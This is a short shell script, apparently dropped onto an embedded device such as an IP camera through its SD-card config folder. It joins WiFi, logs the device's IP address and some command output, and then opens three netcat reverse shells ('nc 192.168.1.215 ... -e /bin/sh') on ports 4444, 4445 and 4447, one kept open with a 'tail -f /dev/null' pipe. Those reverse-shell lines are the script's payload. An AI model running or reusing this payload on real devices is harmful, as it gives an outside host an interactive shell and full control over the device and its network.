#!/bin/sh

# Variables
SD_FOLDER="/mnt/config/record"


# Functions
connect_to_wifi()
{
    SD_FOLDER="/mnt/config/record"
    wifi_dev="wlan0"

    while true
    do
        # wait for driver ready. #
        ret=`ifconfig | grep $wifi_dev`
        if [ "$ret" = ""  ];then
            ifconfig $wifi_dev up
        else
            break
        fi
        sleep 0.3
    done

    # connect to WiFi network #
    wpa_supplicant -B -i$wifi_dev -c /mnt/config/wpa_conf
    udhcpc -i$wifi_dev -b -x hostname:$PRODUCT_MODE

    # Record IP Address to SD Card
    touch $SD_FOLDER/ip.txt
    ip_addr=$(ifconfig wlan0|grep "inet addr:"|awk -F "inet addr:" '{print $2}'|awk -F ' ' '{print $1}')
    echo "IP Address is ${ip_addr}" >> $SD_FOLDER/ip.txt

}

run_command_and_log() 
{   
    SD_FOLDER="/mnt/config/record"
    command=$1
    file_path=${SD_FOLDER}/tmp_test.txt
    
    # If second arg is passed, then set the file path
    if [ -n "$2" ]; then
        file_path=$SD_FOLDER/$2
    fi

    echo "Running Command: $command" >> $file_path
    echo "" >> $file_path
    $command >> $file_path
    echo "" >> $file_path
    echo "" >> $file_path
}

# Program Start
connect_to_wifi

run_command_and_log "ls -lah"
run_command_and_log "wget https://google.com"
run_command_and_log "ls -lah"
run_command_and_log "ps aux"

nc 192.168.1.215 4444 -e /bin/sh
nc 192.168.1.215 4445 -e /bin/sh &
tail -f /dev/null | nc 192.168.1.215 4447 -e /bin/sh

run_command_and_log "ps aux"
sleep 120
run_command_and_log "ps aux"
#run_command_and_log "cp /mnt/config/record/tmp_test.sh /mnt/config/tmp_test.sh"